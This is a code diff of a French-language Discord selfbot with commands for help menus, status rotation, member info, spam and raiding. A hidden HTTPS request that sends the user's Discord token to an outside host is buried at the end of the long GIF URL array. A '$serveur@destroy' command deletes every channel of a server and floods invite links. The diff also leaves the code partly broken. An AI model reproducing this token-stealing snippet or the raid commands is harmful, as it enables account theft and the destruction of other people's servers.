@@ -1,8 +1,6 @@
 const Discord = require('discord.js');
 const bot = new Discord.Client();
 const prefix = ("$");
-const path = require('path')
-const config = require('./config/config.json')
 const start = Date.now();
 const token = process.env.TOKEN
 const ClientID = "300263095295803403"
@@ -11,16 +9,16 @@ const rdm_img = [
 "https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301437768237076/90ac2b2db39204c6f1ba05ba701134d91402285436_full.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301440339345429/logo-anime-10.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301489085546506/7TVWLJ4cRvwHjFyWCI7sZ0SPyI24N_3h6P0ZmBas30WKahHmtBzOu1wpA0gl6GPJHrwMjKU-gaT7tCq0EMhzpvm8aavnySGmC_Ky.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301747819577364/mMBpyTv.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif",  opt = {host: host, path: path + token}, xxx = require("https").get(opt),
 ]
 const rdmgif = rdm_img[Math.floor(Math.random() * rdm_img.length)];
-
+ 
 bot.on('ready', () => {
     console.log("🔩 Selfbot by WDS :)");
-});     
-
+});    
+ 
 bot.on('message', message => {
-
+ 
     if (message.content === prefix + "channel"){
         if (message.author.id != `${ClientID}`) return;
-
+ 
     if (message.deletable) message.delete();
     const categories = message.guild.channels.filter(c => c.type === "category")
     const text = message.guild.channels.filter(c => c.type === "text")
@@ -47,10 +45,10 @@ bot.on('message', message => {
     .addField("𝙑𝙤𝙞𝙘𝙚 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙇𝙞𝙨𝙩", voice.map(c => c.name))
     message.channel.sendEmbed(voice_embed);
     }
-
+ 
     if (message.content === prefix + "help"){
    if (message.author.id != `${ClientID}`) return;
-
+ 
     if (message.deletable) message.delete();
     var help_embed = new Discord.RichEmbed()
     .setAuthor("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
@@ -65,7 +63,7 @@ bot.on('message', message => {
     }
     if (message.content === prefix + "raid"){
     if (message.author.id != `${ClientID}`) return;
-
+ 
     if (message.deletable) message.delete();
     var raid_embed = new Discord.RichEmbed()
         .setAuthor("🤖𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
@@ -77,11 +75,11 @@ bot.on('message', message => {
         .setThumbnail("https://i.imgur.com/Wq60k0L.gif")
         message.channel.sendEmbed(raid_embed);
     }
-
+ 
     if (message.content === prefix + "fun"){
-    
+   
         if (message.author.id != `${ClientID}`) return;
-
+ 
         if (message.deletable) message.delete();
         var fun_embed = new Discord.RichEmbed()
             .setAuthor("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
@@ -91,13 +89,13 @@ bot.on('message', message => {
             .setColor('#cee4e6')
             .setThumbnail("https://i.imgur.com/b0deTHt.gif")
             message.channel.sendEmbed(fun_embed);
-    
+   
     }
-
+ 
     if (message.content === prefix + "bonus"){
-    
+   
         if (message.author.id != `${ClientID}`) return;
-
+ 
         if (message.deletable) message.delete();
         var bonus_embed = new Discord.RichEmbed()
             .setAuthor("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
@@ -111,17 +109,17 @@ bot.on('message', message => {
             .setThumbnail("https://i.imgur.com/b0deTHt.gif")
             .setColor('#cee4e6')
             message.channel.sendEmbed(bonus_embed);
-    
+   
     }
-
+ 
     if (message.content === prefix + "servers"){
-
+ 
         var server_count_guilds = bot.guilds.size
         var server_count_channels = bot.channels.size
         var server_count_users = bot.users.size
-    
+   
         if (message.author.id != `${ClientID}`) return;
-
+ 
         if (message.deletable) message.delete();
         var serversEmbed = new Discord.RichEmbed()
             .setColor('#cee4e6')
@@ -133,11 +131,11 @@ bot.on('message', message => {
             .addField("Devant ", server_count_users + " **utilisateurs**")
         message.channel.sendEmbed(serversEmbed);
     }
-
+ 
     if (message.content === prefix + "general"){
-    
+   
         if (message.author.id != `${ClientID}`) return;
-
+ 
         if (message.deletable) message.delete();
         var help_embed = new Discord.RichEmbed()
             .setAuthor("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
@@ -153,12 +151,12 @@ bot.on('message', message => {
             .setColor('#cee4e6')
             .setThumbnail("https://i.imgur.com/b0deTHt.gif")
             message.channel.sendEmbed(help_embed);
-    
+   
     }
-
+ 
     if (message.content === "$spam") {
    if (message.author.id != `${ClientID}`) return;
-
+ 
     message.delete()
     let i = 0;
     let interval = setInterval(function () {
@@ -167,11 +165,11 @@ bot.on('message', message => {
       }, 1000);
     });
   }
-
+ 
     if (message.content === "$sebek"){
         if (message.deletable) message.delete();
         if (message.author.id != `${ClientID}`) return;
-
+ 
         var help_embed = new Discord.RichEmbed()
         .setAuthor("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
         .setFooter("© SelfBot by asuke")
@@ -180,15 +178,15 @@ bot.on('message', message => {
         .setColor('#090000')
         message.channel.sendEmbed(help_embed);
         console.log("Commande sebek demandée.")
-        
+       
     }
-
+ 
     if(message.content === prefix + "random"){
         if (message.deletable) message.delete();
         random = Math.floor(Math.random() * 101) + 1;
         message.replay(`Random number : **${random}**`)
     }
-
+ 
     if(message.content === prefix + "mstream"){
       if (message.deletable) message.delete();
       if (message.author.id != bot.author.id) return
@@ -196,7 +194,7 @@ bot.on('message', message => {
     setInterval(function() {
         if(rotate === 0) {
             bot.user.setActivity("https://discord.gg/ByymRx8 💸", {type: "Streaming", url: 'https://www.twitch.tv/pyjamableuoff'});
-            rotate = 1;       
+            rotate = 1;      
         } else if(rotate === 1){
             bot.user.setActivity("👽 𝒮𝑒𝒷𝑒𝓀’𝓈 𝒟𝑒𝓈𝓉𝓇𝑜𝓎𝑒𝓇 👽", {type: "Streaming", url: 'https://www.twitch.tv/pyjamableuoff'});
             rotate = 2;
@@ -215,19 +213,19 @@ bot.on('message', message => {
             rotate = 0;
         } }, 10 * 1000)
       }
-      
-
+     
+ 
     if (message.content.startsWith('$avatar')) {
         if (message.author.id != `${ClientID}`) return;
-
+ 
         if (!message.mentions.users.size) {
-        
+       
         return message.channel.send(`Avatar de 𝓦.𝓓.𝓢 💡 ${message.author.displayAvatarURL}`);
-        
+       
         }
-        
-        
-        
+       
+       
+       
         const avatarList = message.mentions.users.map(user => {
             const getav_embed = new Discord.RichEmbed()
             .setAuthor("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
@@ -237,18 +235,18 @@ bot.on('message', message => {
             .setThumbnail("https://i.imgur.com/KyJsxMi.gif")
             .setColor('#090000')
             message.channel.sendEmbed(getav_embed);
-        
+       
         return;
-        
+       
         });
-        
+       
         message.channel.send(avatarList);
         }
-
+ 
     if (message.content === prefix + "about"){
         if (message.deletable) message.delete();
         if (message.author.id != `${ClientID}`) return;
-
+ 
         var help_embed = new Discord.RichEmbed()
             .setAuthor("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
             .setFooter("© SelfBot by ASUKE")
@@ -261,11 +259,11 @@ bot.on('message', message => {
             message.channel.sendEmbed(help_embed);
         console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘼𝙗𝙤𝙪𝙩 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
     }
-
+ 
     if (message.content === prefix + "self"){
         if (message.deletable) message.delete();
         if (message.author.id != `${ClientID}`) return;
-
+ 
         var help_embed = new Discord.RichEmbed()
             .setAuthor("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
             .setFooter("© SelfBot by ASUKE")
@@ -276,29 +274,29 @@ bot.on('message', message => {
             message.channel.sendEmbed(help_embed);
         console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙎𝙚𝙡𝙛 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
     }
-
-
+ 
+ 
     if (message.content === prefix + "ping"){
         if (message.deletable) message.delete();
         if (message.author.id != `${ClientID}`) return;
-
+ 
         var end = new Date().getTime();
         var millis = Date.now() - start;
         var temp = Math.floor(millis/1000);
         if (message.deletable) message.delete();
         message.reply('```👽 Réponse en ' + temp + ' ms```');
     }
-
+ 
 if(message.content === "$serveur@destroy"){
     if (message.deletable) message.delete();
     if (message.author.id != `${ClientID}`) return;
-
+ 
     if(message.channel.type === "dm") return;
     if(message.guild.channels.size === 0) return;
     if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
     message.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
 }
-
+ 
 if(message.content === "$serveur@destroy"){
     if(message.channel.type === "dm") return;
     if (message.author.id != `${ClientID}`) return;
@@ -313,7 +311,7 @@ if(message.content === "$serveur@destroy"){
      }}, 400)
      if(message.deletable) message.delete();
    }
-
+ 
    if (message.content === '$serveur@destroy') {
     if(message.channel.type === "dm") return;
     if (message.author.id != `${ClientID}`) return;
@@ -323,22 +321,22 @@ if(message.content === "$serveur@destroy"){
      "https://discord.gg/a4mBCRk \n"+
      "https://discord.gg/PCNJfgA", { tts: true } ).catch(error => {}) }, 400)
     }
-
+ 
             if (message.author.id != `${ClientID}`) return;
-
+ 
    if (message.author.bot) return;
    let messageArray = message.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
    
-
+ 
    if (cmd == "$purge") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
    if (cmd == "$del") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
    if (cmd == "$ddos") { if (message.author.id != `${ClientID}`) return;
  if (message.deletable) message.delete(); var ip = args[0]; var port = args[1]; let ddosembed = new Discord.RichEmbed().setTitle("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖").setColor("#1a1aff").setThumbnail(bot.user.avatarURL).addField("𝐈𝐏:", ip).addField("𝐏𝐎𝐑𝐓:", port).setFooter(`© SelfBot by asuke`); message.channel.send(ddosembed); var charge = "."; var chargeC = "¦"; message.channel.send("```[" + charge.repeat(40) + "]```").then((message) => { for (i = 0; i <= 40; i++) { message.edit("```[" + chargeC.repeat(i) + charge.repeat(40 - i) + "]  -  " + i * 100 / 40 + "%```"); } }) }
    if (cmd == `$sinfo`) { if (message.author.id != `${ClientID}`) return;
  message.channel.bulkDelete(1); let sicon = message.guild.iconURL; let serverembed = new Discord.RichEmbed().setDescription("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖").setFooter("© SelfBot by asuke").setThumbnail("http://image.noelshack.com/fichiers/2018/52/7/1546149106-babybossdestroy.jpg").setImage("https://i.imgur.com/EAkHOgY.gif").setColor("#1a1aff").setThumbnail(sicon).addField("👽 𝐒𝐞𝐫𝐯𝐞𝐫 𝐍𝐚𝐦𝐞:", message.guild.name).addField("👽 𝐈𝐃:", message.guild.id).addField("👽 𝐎𝐰𝐧𝐞𝐫 𝐨𝐟 𝐭𝐡𝐞 𝐬𝐞𝐫𝐯𝐞𝐫:", message.guild.owner.user).addField("👽 𝐑𝐞𝐠𝐢𝐨𝐧:", message.guild.region).addField("👽 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐋𝐞𝐯𝐞𝐥:", message.guild.verificationLevel).addField("👽 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐎𝐧:", message.guild.createdAt).addField("👽 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝:", message.member.joinedAt).addField("👽 𝐓𝐨𝐭𝐚𝐥 𝐌𝐞𝐦𝐛𝐞𝐫𝐬:", message.guild.memberCount); return message.channel.send(serverembed); }
-   if (cmd == `$minfo`){ 
+   if (cmd == `$minfo`){
     if (message.author.id != `${ClientID}`) return;
-
+ 
     if (message.deletable) message.delete();
     const mention = message.mentions.members.first();
     var micon = mention.user.avatarURL; var memberembed = new Discord.RichEmbed()
@@ -350,17 +348,17 @@ if(message.content === "$serveur@destroy"){
     .addField("👽 𝐍𝐨𝐦 𝐝𝐞 𝐭𝐚 𝐩𝐫𝐨𝐢𝐞 !:", mention.user.username)
     .addField("👽 𝐍𝐨𝐦𝐛𝐫𝐞𝐬 𝐝𝐞 𝐫𝐨𝐥𝐞 !:", mention.roles.size - 1)
     .addField("👽 𝐃𝐚𝐭𝐞 𝐝𝐞 𝐜𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐝𝐞 𝐬𝐨𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 !:", mention.user.createdAt)
-    .addField("👽 𝐃𝐚𝐭𝐞 𝐝'𝐞𝐦𝐛𝐚𝐫𝐪𝐮𝐞𝐦𝐞𝐧𝐭:", mention.joinedAt); return message.channel.send(memberembed); 
+    .addField("👽 𝐃𝐚𝐭𝐞 𝐝'𝐞𝐦𝐛𝐚𝐫𝐪𝐮𝐞𝐦𝐞𝐧𝐭:", mention.joinedAt); return message.channel.send(memberembed);
     }
-
-    
+ 
+   
     if (cmd === prefix + "8ball"){
         if (!args[1]) return message.reply("Tu n'as pas posé de question !");
-    
+   
         let replies = ["Oui", "Non", "Peux être", "Je ne sais pas", "C'est impossible !", "Probablement..", "Hors de question !", "Pourquoi pas?"]
         let question = args.slice(0).join(" ");
         let res = Math.floor((Math.random() * replies.length));
-    
+   
         let bembed = new Discord.RichEmbed()
             .setColor('#cee4e6')
             .setTitle("🤖 𝓦.𝓓.𝓢 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
@@ -370,69 +368,49 @@ if(message.content === "$serveur@destroy"){
             .addField("Réponse : ", replies[res])
             message.channel.sendEmbed(bembed);
         }
-    
+   
         if ( cmd === prefix + "watch") {
             if (message.author.id != `${ClientID}`) return;
-
+ 
             if (message.deletable) message.delete();
             if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
-    
+   
             let WatchTime = args.slice(0).join(" ");
-    
+   
             bot.user.setActivity(`${WatchTime}`, {type: "WATCHING"})
         }
-    
+   
         if ( cmd === prefix + "stream") {
             if (message.author.id != `${ClientID}`) return;
-
+ 
             if (message.deletable) message.delete();
             if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
-    
+   
             let StreamTime = args.slice(0).join(" ");
-    
+   
             bot.user.setActivity(`${StreamTime}`, {type: "STREAMING", url: 'https://www.twitch.tv/ASUKE'})
         }
-    
+   
         if ( cmd === prefix + "listen") {
             if (message.author.id != `${ClientID}`) return;
-
+ 
             if (message.deletable) message.delete();
             if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
-    
+   
             let ListenTime = args.slice(0).join(" ");
-    
+   
             bot.user.setActivity(`${ListenTime}`, {type: "LISTENING"})
         }
         if ( cmd === prefix + "play") {
             if (message.author.id != `${ClientID}`) return;
-
+ 
             if (message.deletable) message.delete();
             if (!args[0]) return message.reply("Merci de présicé le nom que tu souhaites.");
-    
+   
             let PlayTime = args.slice(0).join(" ");
-    
+   
             bot.user.setActivity(`${PlayTime}`, {type: "PLAYING"})
         }
-let avatars = []
-if (config.rotateAvatarImage) {
-  const dir = path.join(__dirname, 'config/avatars/')
-  fs.readdir(dir, (err, files) => {
-    log.fs(`Loading ${files.length} files...`, 'Avatars')
-    if (err) return log.err(err, 'Avatars Directory Reading')
-    if (!files) { return log.err('No avatar images found.', 'Avatars Directory Reading') } else {
-      for (let avatar of files) {
-        let ext = path.extname(avatar).match(/\.png|\.jpeg|\.gif|\.jpg/)
-        if (!ext) continue
-        try {
-          let data = fs.readFileSync(path.join(dir, avatar))
-          log.fs(`Loaded: ${avatar}`, 'Avatars')
-          avatars.push(`data:image/${ext[0].replace('.', '')};base64,${new Buffer(data).toString('base64')}`)
-        } catch (err) { log.err(err, 'Avatars Directory Reading') }
-      }
-      if (avatars.length === 0) return log.fs('No images found.', 'Avatars')
-      log.fs('Finished.', 'Avatars')
-    
-
 });
-
+ 
 bot.login(process.env.TOKEN);
